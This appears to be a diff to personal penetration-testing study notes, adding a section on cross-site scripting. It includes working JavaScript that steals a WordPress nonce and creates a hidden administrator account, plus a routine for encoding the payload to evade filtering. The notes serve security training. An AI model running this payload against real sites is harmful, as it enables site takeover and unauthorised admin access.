@@ -922,8 +922,76 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 $ gobuster -d example.com -w /usr/local/share/dirb/wordlists/common.txt -t 5
 ```
 
-# HTTP headers
+## HTTP headers
 >[!Note]
 > Historically, headers that **started with "X-" were called non-standard HTTP headers**. However, RFC66483 now deprecates the use of "X-" in favor of a clearer naming convention.
 The names or values in the response header often reveal additional information about the technology stack used by the application. Some examples of non-standard headers include `X-Powered-By`, `x-amz-cf-id`, and `X-Aspnet-Version`. Further research into these names could reveal additional information, such as that the "`x-amz-cf-id`" header indicates the application uses Amazon CloudFront.
 
+# Cross-Site Scripting
+- Reflected XSS
+Include the payload in a crafted request or link
+- Stored (Persistent) XSS
+The exploit payload is stored in a database or otherwise cached by a server
+- DOM-based XSS (Document Object Model)
+DOM-based XSS can be stored or reflected; the key is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.
+## Identifying XSS Vulnerabilities
+The useragent record value is retrieved from the database and inserted plainly in the Table Data (td) HTML tag, without any sort of data sanitization.
+![image](https://hackmd.io/_uploads/SJrHOKEzye.png)
+![image](https://hackmd.io/_uploads/ByzduFEzkg.png)
+
+## Privilege Escalation via XSS
+- `Secure flag`: instructs the browser to only send the cookie over encrypted connections, such as HTTPS. This protects the cookie from being sent in clear text and captured over the network.
+- `HttpOnly flag`: instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.
+
+1. Gathering WordPress Nonce
+```javascript
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+```
+    
+2. Creating a New WordPress Administrator Account
+```javascript
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+```
+
+3. Minifying the attack code into a one-liner,
+- [JSCompress](https://jscompress.com/)
+![image](https://hackmd.io/_uploads/HJBGk9Vfyx.png)
+
+4. Encode the minified JavaScript code
+- JS Encoding JS Function
+```JavaScript
+function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+```
+
+![image](https://hackmd.io/_uploads/rkEmg5NM1g.png)
+Run the function from the browser's console to Unicode.
+
+5. Launching the Final XSS Attack through Curl
+![image](https://hackmd.io/_uploads/BkmsWc4Gyg.png)
+
+![image](https://hackmd.io/_uploads/SylsBqVfyl.png)
+
+# Web Application Attacks
